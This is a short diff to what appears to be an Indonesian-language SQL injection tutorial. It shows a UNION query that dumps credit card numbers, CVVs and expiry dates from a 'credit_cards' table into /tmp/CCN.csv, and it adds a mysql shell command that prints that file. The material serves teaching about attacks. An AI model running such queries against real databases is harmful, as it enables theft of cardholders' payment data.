@@ -21,6 +21,7 @@ select * from accounts where username RLIKE '^[0-9]' union select ccid, ccnumber
 Operasi UNION mencetak di file yang berlokasi di **'/tmp/CCN.csv'**
 ```
 select * from accounts where username RLIKE '^[0-9]' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/tmp/CCN.csv' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED by '\n';
+\! cat /tmp/CCN.csv
 ```
 
 
